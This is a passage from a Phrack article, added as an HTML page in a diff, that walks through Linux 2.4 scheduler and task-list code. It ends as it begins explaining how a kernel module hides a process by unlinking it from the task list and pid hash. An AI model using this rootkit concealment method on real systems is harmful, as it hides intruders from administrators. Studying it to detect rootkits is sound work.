@@ -1,0 +1,1335 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Process Hiding &amp; The Linux Scheduler ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a class="current" href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack63.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack63.tar.gz" title="Get current issue tar.gz">63</a> | <strong>Release date</strong> : <b>2005-01-08</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/63/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/2.html#article">Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/3.html#article">Linenoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/4.html#article">Phrack Prophile on Tiago</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/5.html#article">OSX heap exploitation techniques</a></td><td align="right">Nemo</td></tr>
+<tr><td align="left"><a href="../../issues/63/6.html#article">Hacking Windows CE (pocketpcs &amp; others)</a></td><td align="right">San</td></tr>
+<tr><td align="left"><a href="../../issues/63/7.html#article">Games with kernel Memory...FreeBSD Style</a></td><td align="right">jkong</td></tr>
+<tr><td align="left"><a href="../../issues/63/8.html#article">Raising The Bar For Windows Rootkit Detection</a></td><td align="right">sherri sparks &amp; jamie butler</td></tr>
+<tr><td align="left"><a href="../../issues/63/9.html#article">Embedded ELF Debugging</a></td><td align="right">ELFsh crew</td></tr>
+<tr><td align="left"><a href="../../issues/63/10.html#article">Hacking Grub for Fun &amp; Profit</a></td><td align="right">coolq</td></tr>
+<tr><td align="left"><a href="../../issues/63/11.html#article">Advanced antiforensics : SELF</a></td><td align="right">ripe &amp; pluf</td></tr>
+<tr><td align="left"><a href="../../issues/63/12.html#article">Process Dump and Binary Reconstruction</a></td><td align="right">ilo</td></tr>
+<tr><td align="left"><a href="../../issues/63/13.html#article">Next-Gen. Runtime Binary Encryption</a></td><td align="right">zvrba</td></tr>
+<tr><td align="left"><a href="../../issues/63/14.html#article">Shifting the Stack Pointer</a></td><td align="right">andrewg</td></tr>
+<tr><td align="left"><a href="../../issues/63/15.html#article">NT Shellcode Prevention Demystified</a></td><td align="right">piotr</td></tr>
+<tr><td align="left"><a href="../../issues/63/16.html#article">PowerPC Cracking on OSX with GDB</a></td><td align="right">curious</td></tr>
+<tr><td align="left"><a href="../../issues/63/17.html#article">Hacking with Embedded Systems</a></td><td align="right">cawan</td></tr>
+<tr><td align="left"><a href="../../issues/63/18.html#article">Process Hiding &amp; The Linux Scheduler</a></td><td align="right">ubra</td></tr>
+<tr><td align="left"><a href="../../issues/63/19.html#article">Breaking Through a Firewall</a></td><td align="right">kotkrye</td></tr>
+<tr><td align="left"><a href="../../issues/63/20.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Process Hiding &amp; The Linux Scheduler</div>
+<div class="opt-bottom"> <strong>Author</strong> : ubra</div>
+<pre>                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3f, Phile #0x12 of 0x14
+
+|=------=[ hiding processes  ( understanding the linux scheduler ) ]=----=|
+|=-----------------------------------------------------------------------=|
+|=------------=[  by ubra from PHI Group -- 17 October 2004 ]=-----------=|
+|=-----=[ mail://ubra_phi.group.za.org  http://w3.phi.group.za.org ]=----=|
+
+
+--[ Table of contents
+
+  1 - looking back
+
+  2 - the schedule(r) inside
+
+  3 - abusing the silence ( attacking )
+
+  4 - can you scream ? ( countering )
+
+  5 - references
+
+  6 - and the game dont stop..
+
+  7 - sources
+
+
+
+--[ 1 - looking back
+
+    We begin our journey in the old days, when simply giving your
+process a weird name was enough to hide inside the tree. Sadly this is
+also quite effective these days due to lack of skill from stock admins.
+In the last millenium ..well actualy just before 1999, backdooring
+binaries was very popular (ps, top, pstree and others [1]) but this was
+very easy to spot, `ls -l` easy / although some could only be cought by
+a combination of size and some checksum / (i speak having in mind the
+skilled admin, because, in my view, an admin that isnt a bit hackerish
+is just the guy mopping up the keyboard). And it was a pain in the ass
+compatibility wise.
+
+    LRK (linux root kit) [2] is a good example of a &quot;binary&quot; kit.
+Not that long ago hackers started to turn towards the kernel to do their
+evil or to secure it. So,like everywhere this was an incremental process,
+starting from the upper level and going more inside kernel structures.
+The obvious place to look first were system calls, the entry point from
+userland to wonderland, and so the hooking method developed, be it by
+altering the sys_call_table[] (theres an article out there LKM_HACKING
+by pragmatic from THC about this [3]), or placing a jump inside the
+function body to your own code (developed by Silvio Cesare [4]) or even
+catching them at interrupt level (read about this in [5]).. and with this,
+one could intercept certain interesting system calls.
+
+    But syscalls are by no means the last (first) point where the pid
+structures get assembled. getdents() and alike are just calling on some
+other function, and they are doing this by means of yet another layer,
+going through the so called VFS. Hacking this VFS (Virtual FileSystem
+layer) is the new trend on todays kits; and since all unices are basicaly
+comprised of the same logical layers, this is (was) very portable. So as
+you see we are building from higher levels, programming wise, to lower
+levels; from simply backdoring the source of our troubles to going closer
+to the root, to the syscalls (and the functions that are
+&quot;syscall-helpers&quot;). The VFS is not by all means as low as we can go
+(hehe we hackers enjoy rolling in the mud of the kernel). We yet have to
+explore the last frontier (well relatively speaking any new frontier is 
+the last). Yup, the very structures that help create the pid list -
+the task_structs. And this is where our journey
+begins.
+
+    Some notes.. kernel studied is from 2.4 branch (2.4.18 for source
+excerpts and 2.4.30 for patches and example code), theres some x86
+specific code (sorry, i dont have access to other archs), also SMP is
+not discussed for the same reason and anyway it should be clear in the
+end what will be different from UP machines.
+
+/*
+	it seems the method i explain here is begining to emerge in part
+into the open underground in zero rk made by stealth from team teso, theres
+an article about it in phrack 61 [6], i was just about to miss the small
+REMOVE_LINKS looking so innocent there :-)
+*/
+
+
+
+--[ 2 - the schedule(r) inside
+
+    As processes give birth to other processes (just like in real life)
+they call on execve() or fork() syscalls to either get replaced or get
+splited into two different processes, a few things happen. We will look
+into fork as this is more interesting from our point of view.
+
+ $ grep -rn sys_fork src/linux/
+
+    For i386 compatible archs which is what I have, you will see that
+without any introduction this function calls do_fork() which is where the
+arch independent work gets done. It is in kernel/fork.c.
+
+&lt;codesnip src=&quot;arch/i386/kernel/process.c&quot; line=747&gt;
+asmlinkage int sys_fork(struct pt_regs regs)
+{
+        return do_fork(SIGCHLD, regs.esp, &amp;regs, 0);
+}
+&lt;/codesnip src=&quot;arch/i386/kernel/process.c&quot;&gt;
+
+    Besides great things which are not within the scope of this here,
+do_fork() allocates memory for a new task_struct
+
+&lt;codesnip src=&quot;kernel/fork.c&quot; line=587&gt;
+int do_fork(unsigned long clone_flags, unsigned long stack_start,
+            struct pt_regs *regs, unsigned long stack_size)
+{
+        .......
+        struct task_struct *p;
+        .......
+        p = alloc_task_struct();
+&lt;/codesnip src=&quot;kernel/fork.c&quot;&gt;
+
+and does some stuff on it like initializing the run_list,
+
+&lt;codesnip src=&quot;kernel/fork.c&quot; line=653&gt;
+        INIT_LIST_HEAD(&amp;p-&gt;run_list);
+&lt;/codesnip src=&quot;kernel/fork.c&quot;&gt;
+
+which is basicaly a pointer (you should read about the linux linked list
+implementation to grasp this clearly [7]) that will be used in a linked
+list of all the processes waiting for the cpu and those expired (that got
+the cpu taken away, not released it willingly by means of schedule()),
+used inside the schedule() function.
+
+	The current priority array of what task queue we are in
+&lt;codesnip src=&quot;kernel/fork.c&quot; line=687&gt;
+        p-&gt;array = NULL;
+&lt;/codesnip src=&quot;kernel/fork.c&quot;&gt;
+
+(well we arent in any yet); the prio array and the runqueues are used
+inside the schedule() function to organize the tasks running and needing to
+be run.
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=124&gt;
+typedef struct runqueue runqueue_t;
+
+struct prio_array {
+        int nr_active;
+        spinlock_t *lock;
+        runqueue_t *rq;
+        unsigned long bitmap[BITMAP_SIZE];
+        list_t queue[MAX_PRIO];
+};
+
+/*
+ * This is the main, per-CPU runqueue data structure.
+ *
+ * Locking rule: those places that want to lock multiple runqueues
+ * (such as the load balancing or the process migration code), lock
+ * acquire operations must be ordered by ascending &amp;runqueue.
+ */
+struct runqueue {
+        spinlock_t lock;
+        unsigned long nr_running, nr_switches, expired_timestamp;
+        task_t *curr, *idle;
+        prio_array_t *active, *expired, arrays[2];
+        int prev_nr_running[NR_CPUS];
+} ____cacheline_aligned;
+
+static struct runqueue runqueues[NR_CPUS] __cacheline_aligned;
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+We`ll be discussing more about this later.
+
+    The cpu time that this child will get; half the parent has goes to
+the child (the cpu time is the amout of time the task will get the
+processor for itself).
+
+&lt;codesnip src=&quot;kernel/fork.c&quot; line=727&gt;
+        p-&gt;time_slice = (current-&gt;time_slice + 1) &gt;&gt; 1;
+        current-&gt;time_slice &gt;&gt;= 1;
+        if (!current-&gt;time_slice) {
+                /*
+                 * This case is rare, it happens when the parent has only
+                 * a single jiffy left from its timeslice. Taking the
+                 * runqueue lock is not a problem.
+                 */
+                current-&gt;time_slice = 1;
+                scheduler_tick(0,0);
+        }
+&lt;/codesnip src=&quot;kernel/fork.c&quot;&gt;
+
+(for the neophytes, &quot;&gt;&gt; 1&quot; is the same as &quot;/ 2&quot;)
+
+    Next we get the tasklist lock for write to place the new process in
+the linked list and pidhash list
+
+&lt;codesnip src=&quot;kernel/fork.c&quot; line=752&gt;
+        write_lock_irq(&amp;tasklist_lock);
+	.......
+        SET_LINKS(p);
+        hash_pid(p);
+        nr_threads++;
+        write_unlock_irq(&amp;tasklist_lock);
+&lt;/codesnip src=&quot;kernel/fork.c&quot;&gt;
+
+and release the lock. include/linux/sched.h has these macro and inline
+functions, and the struct task_struct also:
+
+&lt;codesnip src=&quot;include/linux/sched.h&quot; line=292&gt;
+struct task_struct {
+        .......
+        task_t *next_task, *prev_task;
+        .......
+        task_t *pidhash_next;
+        task_t **pidhash_pprev;
+&lt;/codesnip src=&quot;include/linux/sched.h&quot;&gt;
+
+&lt;codesnip src=&quot;include/linux/sched.h&quot; line=532&gt;
+#define PIDHASH_SZ (4096 &gt;&gt; 2)
+extern task_t *pidhash[PIDHASH_SZ];
+
+#define pid_hashfn(x)   ((((x) &gt;&gt; 8) ^ (x)) &amp; (PIDHASH_SZ - 1))
+
+static inline void hash_pid(task_t *p)
+{
+        task_t **htable = &amp;pidhash[pid_hashfn(p-&gt;pid)];
+
+        if((p-&gt;pidhash_next = *htable) != NULL)
+                (*htable)-&gt;pidhash_pprev = &amp;p-&gt;pidhash_next;
+        *htable = p;
+        p-&gt;pidhash_pprev = htable;
+}
+&lt;/codesnip src=&quot;include/linux/sched.h&quot;&gt;
+
+&lt;codesnip src=&quot;include/linux/sched.h&quot; line=863&gt;
+#define SET_LINKS(p) do { \
+        (p)-&gt;next_task = &amp;init_task; \
+        (p)-&gt;prev_task = init_task.prev_task; \
+        init_task.prev_task-&gt;next_task = (p); \
+        init_task.prev_task = (p); \
+        (p)-&gt;p_ysptr = NULL; \
+        if (((p)-&gt;p_osptr = (p)-&gt;p_pptr-&gt;p_cptr) != NULL) \
+                (p)-&gt;p_osptr-&gt;p_ysptr = p; \
+        (p)-&gt;p_pptr-&gt;p_cptr = p; \
+        } while (0)
+&lt;/codesnip src=&quot;include/linux/sched.h&quot;&gt;
+
+    So, pidhash is an array of pointers to task_structs which hash to
+the same pid, and are linked by means of pidhash_next/pidhash_pprev; this
+list is used by syscalls which get a pid as parameter, like kill() or
+ptrace(). The linked list is used by the /proc VFS and not only.
+
+	Last, the magic:
+
+&lt;codesnip src=&quot;kernel/fork.c&quot; line=776&gt;
+#define RUN_CHILD_FIRST 1
+#if RUN_CHILD_FIRST
+        wake_up_forked_process(p);      /* do this last */
+#else
+        wake_up_process(p);             /* do this last */
+#endif
+&lt;/codesnip src=&quot;kernel/fork.c&quot;&gt;
+
+this is a function in kernel/sched.c which places the task_t (task_t is a
+typedef to a struct task_struct) in the cpu runqueue.
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=347&gt;
+void wake_up_forked_process(task_t * p)
+{
+        .......
+        p-&gt;state = TASK_RUNNING;
+        .......
+        activate_task(p, rq);
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+    So lets walk through a process that after it gets the cpu calls just
+sys_nanosleep (sleep() is just a frontend) and jumps in a never ending loop,
+ill try to make this short. After setting the task state to
+TASK_INTERRUPTIBLE (makes sure we get off the cpu queue when schedule() is
+called), sys_nanosleep() calls upon another function, schedule_timeout()
+which sets us on a timer queue by means of add_timer() which makes sure we
+get woken up (that we get back on the cpu queue) after the delay has
+passed and effectively relinquishes the cpu by calling shedule() (most
+blocking syscalls implement this by putting the process to sleep until the
+perspective resource is available).
+
+&lt;codesnip src=&quot;kernel/timer.c&quot; line=877&gt;
+asmlinkage long sys_nanosleep(struct timespec *rqtp, struct timespec *rmtp)
+{
+        .......
+        current-&gt;state = TASK_INTERRUPTIBLE;
+        expire = schedule_timeout(expire);
+&lt;/codesnip src=&quot;kernel/timer.c&quot;&gt;
+
+&lt;codesnip src=&quot;kernel/timer.c&quot; line=819&gt;
+signed long schedule_timeout(signed long timeout)
+{
+        struct timer_list timer;
+        .......
+        init_timer(&amp;timer);
+        timer.expires = expire;
+        timer.data = (unsigned long) current;
+        timer.function = process_timeout;
+
+        add_timer(&amp;timer);
+        schedule();
+&lt;/codesnip src=&quot;kernel/timer.c&quot;&gt;
+
+If you want to read more about timers look into [7].
+
+    Next, schedule() takes us off the runqueue since we already arranged
+to be set on again there later by means of timers.
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=744&gt;
+asmlinkage void schedule(void)
+{
+        .......
+                deactivate_task(prev, rq);
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+(remember that wake_up_forked_process() called activate_task() to place us
+on the active run queue). In case there are no tasks in the active queue
+it tryes to get some from the expired array as it needs to set up for
+another task to run.
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=784&gt;
+        if (unlikely(!array-&gt;nr_active)) {
+                /*
+                 * Switch the active and expired arrays.
+                 */
+		.......
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+Then finds the first process there and prepares for the switch (if it
+doesnt find any it just leaves the current task running).
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=805&gt;
+                context_switch(prev, next);
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+This is an inline function that prepares for the switch which will get done
+in __switch_to() (switch_to() is just another inline function, sort of)
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=400&gt;
+static inline void context_switch(task_t *prev, task_t *next)
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+&lt;codesnip src=&quot;include/asm-i386/system.h&quot; line=15&gt;
+#define prepare_to_switch()     do { } while(0)
+#define switch_to(prev,next,last) do {                                  \
+        asm volatile(&quot;pushl %%esi\n\t&quot;                                  \
+                     &quot;pushl %%edi\n\t&quot;                                  \
+                     &quot;pushl %%ebp\n\t&quot;                                  \
+                     &quot;movl %%esp,%0\n\t&quot;        /* save ESP */          \
+                     &quot;movl %3,%%esp\n\t&quot;        /* restore ESP */       \
+                     &quot;movl $1f,%1\n\t&quot;          /* save EIP */          \
+                     &quot;pushl %4\n\t&quot;             /* restore EIP */       \
+                     &quot;jmp __switch_to\n&quot;                                \
+                     &quot;1:\t&quot;                                             \
+                     &quot;popl %%ebp\n\t&quot;                                   \
+                     &quot;popl %%edi\n\t&quot;                                   \
+                     &quot;popl %%esi\n\t&quot;                                   \
+                     :&quot;=m&quot; (prev-&gt;thread.esp),&quot;=m&quot; (prev-&gt;thread.eip),  \
+                      &quot;=b&quot; (last)                                       \
+                     :&quot;m&quot; (next-&gt;thread.esp),&quot;m&quot; (next-&gt;thread.eip),    \
+                      &quot;a&quot; (prev), &quot;d&quot; (next),                           \
+                      &quot;b&quot; (prev));                                      \
+} while (0)
+&lt;/codesnip src=&quot;include/asm-i386/system.h&quot;&gt;
+
+    Notice the &quot;jmp __switch_to&quot; inside all that assembly code that
+simply arranges the arguments on the stack.
+
+&lt;codesnip src=&quot;arch/i386/kernel/process.c&quot; line=682&gt;
+void __switch_to(struct task_struct *prev_p, struct task_struct *next_p)
+{
+&lt;/codesnip src=&quot;arch/i386/kernel/process.c&quot;&gt;
+
+context_switch() and switch_to() causes what is known as a context switch
+(hence the name) which in not so many words is giving the processor and
+memory control to another task.
+
+    But enough of this; now what happends when we jump in the never
+ending loop. Well, its not actually a never ending loop, if it would be
+your computer would just hang. What actually happends is that your task
+gets the cpu taken away from it every once in a while and gets it back
+after some other tasks get time to run (theres queueing mechanisms that
+let tasks share the cpu based on theire priority, if our task would have
+a real time priority it would have to release the cpu manualy by
+sched_yeld()). So how exactly is this done; lets talk a bit about the
+timer interrupt first coz its closely related.
+
+    This is a function like most things are in the linux kernel, and its
+described in a struct
+
+&lt;codesnip src=&quot;arch/i386/kernel/time.c&quot; line=556&gt;
+static struct irqaction irq0  = { timer_interrupt, SA_INTERRUPT, 0,
+                                  &quot;timer&quot;, NULL, NULL};
+&lt;/codesnip src=&quot;arch/i386/kernel/time.c&quot;&gt;
+
+and setup in time_init.
+
+&lt;codesnip src=&quot;arch/i386/kernel/time.c&quot; line=635&gt;
+void __init time_init(void)
+{
+        .......
+#ifdef CONFIG_VISWS
+        .......
+        setup_irq(CO_IRQ_TIMER, &amp;irq0);
+#else
+        setup_irq(0, &amp;irq0);
+#endif
+&lt;/codesnip src=&quot;arch/i386/kernel/time.c&quot;&gt;
+
+After this, every timer click, timer_interrupt() is called and at some
+point calls do_timer_interrupt()
+
+&lt;codesnip src=&quot;arch/i386/kernel/time.c&quot; line=466&gt;
+static void timer_interrupt(int irq, void *dev_id, struct pt_regs *regs)
+{
+        .......
+        do_timer_interrupt(irq, NULL, regs);
+&lt;/codesnip src=&quot;arch/i386/kernel/time.c&quot;&gt;
+
+which calls on do_timer (bare with me).
+
+&lt;codesnip src=&quot;arch/i386/kernel/time.c&quot; line=393&gt;
+static inline void do_timer_interrupt(int irq, void *dev_id,
+                                      struct pt_regs *regs)
+{
+        .......
+        do_timer(regs);
+&lt;/codesnip src=&quot;arch/i386/kernel/time.c&quot;&gt;
+
+do_timer() does two things, first update the current process times and
+second call on schedule_tick() which precurses schedule() by first taking
+the current process of the active array and placing it in the expired
+array; this is the place where bad processes (the dirty hogs :-) get
+their cpu taken away from them.
+
+&lt;codesnip src=&quot;kernel/timer.c&quot; line=665&gt;
+void do_timer(struct pt_regs *regs)
+{
+        (*(unsigned long *)&amp;jiffies)++;
+#ifndef CONFIG_SMP
+        /* SMP process accounting uses the local APIC timer */
+
+        update_process_times(user_mode(regs));
+#endif
+&lt;/codesnip src=&quot;kernel/timer.c&quot;&gt;
+
+&lt;codesnip src=&quot;kernel/timer.c&quot; line=578&gt;
+/*
+ * Called from the timer interrupt handler to charge one tick to the
+ * current process.  user_tick is 1 if the tick is user time, 0 for system.
+ */
+void update_process_times(int user_tick)
+{
+        .......
+        update_one_process(p, user_tick, system, cpu);
+        scheduler_tick(user_tick, system);
+}
+&lt;/codesnip src=&quot;kernel/timer.c&quot;&gt;
+
+&lt;codesnip src=&quot;kernel/sched.c&quot; line=663&gt;
+/*
+ * This function gets called by the timer code, with HZ frequency.
+ * We call it with interrupts disabled.
+ */
+void scheduler_tick(int user_tick, int system)
+{
+     .......
+     /* Task might have expired already, but not scheduled off yet */
+        if (p-&gt;array != rq-&gt;active) {
+                p-&gt;need_resched = 1;
+                return;
+        }
+        .......
+        if (!--p-&gt;time_slice) {
+                dequeue_task(p, rq-&gt;active);
+                p-&gt;need_resched = 1;
+		.......
+                if (!TASK_INTERACTIVE(p) || EXPIRED_STARVING(rq)) {
+			.......
+                        enqueue_task(p, rq-&gt;expired);
+                } else
+                        enqueue_task(p, rq-&gt;active);
+        }
+&lt;/codesnip src=&quot;kernel/sched.c&quot;&gt;
+
+Notice the &quot;need_resched&quot; field of the task struct getting set; now the
+ksoftirqd() task which is a kernel thread will catch this process and call
+schedule()
+
+ [root@absinth root]# ps aux | grep ksoftirqd
+ root     3  0.0  0.0     0    0 ?  SWN  11:45   0:00    [ksoftirqd_CPU0]
+
+&lt;codesnip src=&quot;kernel/softirq.c&quot; line=398&gt;
+__init int spawn_ksoftirqd(void)
+{
+        .......
+        for (cpu = 0; cpu &lt; smp_num_cpus; cpu++) {
+                if (kernel_thread(ksoftirqd, (void *) (long) cpu,
+                               CLONE_FS | CLONE_FILES | CLONE_SIGNAL) &lt; 0)
+                     printk(&quot;spawn_ksoftirqd() failed for cpu %d\n&quot;, cpu);
+                .......
+
+__initcall(spawn_ksoftirqd);
+&lt;/codesnip src=&quot;kernel/softirq.c&quot;&gt;
+
+&lt;codesnip src=&quot;kernel/softirq.c&quot; line=361&gt;
+static int ksoftirqd(void * __bind_cpu)
+{
+        .......
+        for (;;) {
+                .......
+                        if (current-&gt;need_resched)
+                                schedule();
+                .......
+&lt;/codesnip src=&quot;kernel/softirq.c&quot;&gt;
+
+    And if all this seems bogling to you dont worry, just walk through
+the kernel sources again from the begining and try to understand more than
+im explaining here, no one expects you to understand from the first read
+through such a complicated process like the linux scheduling.. remeber that
+the cookie lies in the details ;-) you can read more about the linux
+scheduler in [7], [8] and [9]
+
+Every cpu has its own runqueue, so apply the same logic for SMP;
+
+    So you can see how a process can be on any number of lists waiting
+for execution, and if its not on the linked task_struct list we`re in big
+trouble trying to find it. The linked and pidhash lists are NOT used by
+the schedule() code to run your program as you saw, some syscalls do use
+these (ptrace, alarm, the timers in general which use signals and all
+calls that use a pid - for the pidhash list)
+
+    Another note to the reader..all example progs from the _attacking_
+section will be anemic modules, no dev/kmem for you since i dont want my
+work to wind up in some lame rk that would only contribute to wrecking the
+net, although kmem counterparts have been developed and tested to work
+fine, and also, with modules we are more portable, and our goal is to
+present working examples that teach and dont krash your kernel; the
+countering section will not have a kmem enabled prog simply because I'm
+lazy and not in the mood to mess with elf relocations (yup to loop the
+list in a reliable way we have to go in kernel with the code)..
+I'll be providing a kernel patch though for those not doing modules.
+
+You should know that if any modules give errors like
+&quot;hp.o: init_module: Device or resource busy
+Hint: insmod errors can be caused by incorrect module parameters,
+including invalid IO or IRQ parameters
+
+    You may find more information in syslog or the output from dmesg&quot;
+when inserting, this is a &quot;feature&quot; (heh) so that you wont have to rmmod
+it, the modules do the job theyre supposed to.
+
+
+--[ 3 - abusing the silence ( attacking )
+
+    If you dont have the IQ of a windoz admin, it should be pretty clear
+to you by now where we are going with this. Oh im sorry i meant to say
+&quot;Windows (TM) admin (TM)&quot; but the insult still goes. Since the linked list
+and pidhash have no use to the scheduler, a program, a task in general
+(kernel threads also) can run happy w/o them. So we remove it from there
+with REMOVE_LINKS/unhash_pid and if youve been a happy hacker looking at
+all of the sources ive listed you know by now what these 2 functions do.
+All that will suffer from this operation is the IPC methods (Inter Process
+Comunications); heh well were invisible why the fuck would we answer if
+someone asks &quot;is someone there ?&quot; :) however since only the linked list is
+used to output in ps and alike we could leave pidhash untouched so that
+kill/ptrace/timers.. will work as usualy. but i dont see why would anyone
+want this as a simple bruteforce of the pid space with kill(pid,0) can
+uncover you.. See pisu program that i made that does just that but using 76
+syscalls besides kill that &quot;leak&quot; pid info from the two list structures. So
+you get the picture, right ?
+
+hp.c is a simple module to hide a task:
+
+ [root@absinth ksched]# gcc -c -I/$LINUXSRC/include src/hp.c -o src/hp.o
+
+
+[Method 1]
+
+Now to show you what happends when we unlink the process from certain
+lists; first from the linked list
+
+ [root@absinth ksched]# ps aux | grep sleep
+ root      1129  0.0  0.5  1848  672 pts/4    S    22:00   0:00 sleep 666
+ root      1131  0.0  0.4  1700  600 pts/2    R    22:00   0:00 grep sleep
